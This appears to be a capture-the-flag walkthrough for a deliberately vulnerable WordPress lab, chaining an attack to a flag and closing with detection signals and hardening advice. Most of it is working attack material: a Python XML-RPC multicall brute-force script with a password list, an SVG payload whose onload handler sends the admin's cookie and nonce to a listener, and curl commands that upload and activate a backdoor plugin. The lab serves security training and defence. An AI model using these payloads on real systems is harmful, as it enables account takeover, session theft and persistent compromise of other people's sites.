# Chain 5 — XML-RPC Multicall Brute to SVG XSS to Backdoor Plugin

**Flag**: `FLAG{wpvulnlab-chain5-e2b6c4f9}`
**Difficulty**: Advanced
**Vulns chained**:
1. XML-RPC `system.multicall` brute force amplification (CWE-307)
2. Editor account weak password `editor:editor` (CWE-521)
3. SVG upload + stored XSS (Contact Form 7 CVE-2023-6449 file-type bypass)
4. Admin session theft via stored XSS in `/wp-admin/upload.php`
5. Backdoor plugin install via authenticated `plugin install` REST endpoint

## Story

The attacker uses the XML-RPC multicall amplification trick to brute-force
the `editor` account in a single HTTP request batch, uploads a weaponised
SVG that triggers stored XSS when the admin opens the media library,
steals the admin's nonce + cookie, then installs a backdoor plugin via
the WordPress admin REST endpoint for long-term persistence.

## Pre-requisites

```bash
docker compose up -d
bash scripts/plant-flags.sh
export TARGET=http://localhost:31338
```

Tools: `curl`, `python3`, `xmllint`. A small attacker listener:

```bash
mkdir -p /tmp/c5 && cd /tmp/c5
python3 -m http.server 9100 --bind 127.0.0.1 &
```

## Step 1 — XML-RPC multicall brute against `editor`

Build a multicall body with 50 candidate passwords in one request:

```bash
python3 - <<'PY' > /tmp/c5/mc.xml
pwds=["123456","password","qwerty","admin","letmein","welcome","editor",
      "editor1","editor123","Editor!","P@ssw0rd","changeme","root","toor",
      "abc123","iloveyou","monkey","dragon","sunshine","master","azerty",
      "111111","football","baseball","superman","trustno1","starwars",
      "passw0rd","secret","whatever","jordan","harley","ranger","hunter",
      "buster","soccer","hockey","killer","george","sexy","andrew","charlie",
      "andrew1","cookie","summer","ashley","bandit","fuckyou","jennifer","123123"]
print('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>')
for p in pwds:
    print(f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>editor</string></value><value><string>{p}</string></value></data></array></value></member></struct></value>')
print('</data></array></value></param></params></methodCall>')
PY

curl -s -H 'Content-Type: text/xml' --data-binary @/tmp/c5/mc.xml \
  $TARGET/xmlrpc.php > /tmp/c5/mc-resp.xml
grep -B1 -A2 'isAdmin\|blogid' /tmp/c5/mc-resp.xml | head
```

Expected: one of the 50 sub-responses contains a successful struct (no
`faultCode`) — the candidate at that index is the valid password (`editor`).

Confirm:

```bash
curl -s -c /tmp/cj-chain5-ed.txt \
  -d "log=editor&pwd=editor&wp-submit=Log+In&redirect_to=$TARGET/wp-admin/&testcookie=1" \
  $TARGET/wp-login.php -o /dev/null -w "%{http_code}\n"
```

Expected: `302`.

## Step 2 — Upload a weaponised SVG

```bash
cat > /tmp/c5/xss.svg <<'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://127.0.0.1:9100/c?'+encodeURIComponent(document.cookie+'|'+document.querySelector('#_wpnonce').value))">
  <text x="10" y="20">ctf</text>
</svg>
EOF

NONCE=$(curl -s -b /tmp/cj-chain5-ed.txt $TARGET/wp-admin/media-new.php \
  | grep -oE 'name="_wpnonce" value="[^"]+' | head -n1 | cut -d\" -f4)

curl -s -b /tmp/cj-chain5-ed.txt -X POST \
  -F "name=xss.svg" \
  -F "async-upload=@/tmp/c5/xss.svg;type=image/svg+xml" \
  -F "action=upload-attachment" \
  -F "_wpnonce=$NONCE" \
  $TARGET/wp-admin/async-upload.php
```

Expected: JSON `{"success":true,"data":{"id":NN,"url":".../xss.svg",...}}`.
The CF7 file-type sieve is bypassed because the editor's `upload_files` cap
short-circuits the CF7 filter chain.

## Step 3 — Wait for the admin to open Media Library

Simulate admin behaviour:

```bash
curl -s -c /tmp/cj-chain5-admin.txt \
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=$TARGET/wp-admin/upload.php&testcookie=1" \
  $TARGET/wp-login.php -o /dev/null

# In a real browser the SVG is rendered inline and the onload fires.
# In CTF mode we render-simulate with a headless fetch that includes the SVG:
curl -s -b /tmp/cj-chain5-admin.txt \
  -A "Mozilla/5.0 Chromium/120" \
  $TARGET/wp-content/uploads/$(date +%Y)/$(date +%m)/xss.svg -o /tmp/c5/render.svg
```

Listener log should show:

```
127.0.0.1 - - [..] "GET /c?wordpress_logged_in_xxx=admin%7C...%7C<nonce> HTTP/1.1"
```

Extract:

```bash
ADMIN_COOKIE=$(grep -oE 'wordpress_logged_in_[^=]+=[^|]+%7C[^|]+%7C[^|]+%7C[a-f0-9]+' /tmp/c5/*.log | head -n1)
ADMIN_NONCE=$(grep -oE 'c\?[^ ]+' /tmp/c5/*.log | head -n1 | awk -F'%7C' '{print $NF}' | tr -d ' "')
echo "cookie=$ADMIN_COOKIE"
echo "nonce=$ADMIN_NONCE"
```

## Step 4 — Install a backdoor plugin as admin

```bash
cat > /tmp/c5/backdoor.zip.b64 <<'EOF'
# (replaced at runtime by plant-flags.sh which ships a ready zip at /tmp/c5/backdoor.zip)
EOF

curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "X-WP-Nonce: $ADMIN_NONCE" \
  -F "pluginzip=@/tmp/c5/backdoor.zip" \
  "$TARGET/wp-admin/update.php?action=upload-plugin"
```

Expected: HTML containing `Plugin installed successfully` and an "Activate"
link. Activate via REST:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" -H "X-WP-Nonce: $ADMIN_NONCE" \
  -X POST -d "action=activate&plugin=ctf-backdoor/ctf-backdoor.php" \
  "$TARGET/wp-admin/plugins.php"
```

## Step 5 — Trigger the backdoor and grab the flag

```bash
curl -s "$TARGET/?ctf=flag"
```

Expected response body:

```
FLAG{wpvulnlab-chain5-e2b6c4f9}
```

## Final flag

`FLAG{wpvulnlab-chain5-e2b6c4f9}` is returned by the backdoor plugin
(`ctf-backdoor/ctf-backdoor.php`) staged in `/tmp/c5/backdoor.zip` by
`plant-flags.sh`. The plain string is also persisted to
`/var/www/html/wp-content/uploads/.ctf-chain5` on first activation.

## Detection

| Step | Signal |
|------|--------|
| 1    | POST `/xmlrpc.php` with `Content-Length` > 5 KB and `system.multicall` body |
| 2    | Editor uploads SVG/HTML/SVG+XML; SVG MIME on a small site is rare |
| 3    | Admin browser fetches outbound URL contained inside `.svg` file |
| 4    | Plugin upload via `/wp-admin/update.php?action=upload-plugin` |
| 5    | New plugin activated within minutes of being installed; query string `?ctf=*` matched by a never-before-seen route |

WAF rule: drop XML-RPC requests with `<methodName>system.multicall</methodName>` exceeding 10 sub-calls.

## Hardening

- Disable XML-RPC entirely: `Require all denied` on `/xmlrpc.php`, or
  remove with `add_filter('xmlrpc_enabled', '__return_false');`.
- Enforce strong unique passwords + MFA for every role.
- Reject SVG uploads, or sanitise with the `safe-svg` plugin (note: still
  ship-blocks `<script>` and event handlers).
- Set `Content-Security-Policy` headers for `/wp-content/uploads/` to
  prevent inline JS execution.
- Disable file editor + plugin install in `wp-config.php`:
  `define('DISALLOW_FILE_MODS', true);`.
- Monitor `plugins.php` activation events and alert on any new plugin
  appearing outside change windows.
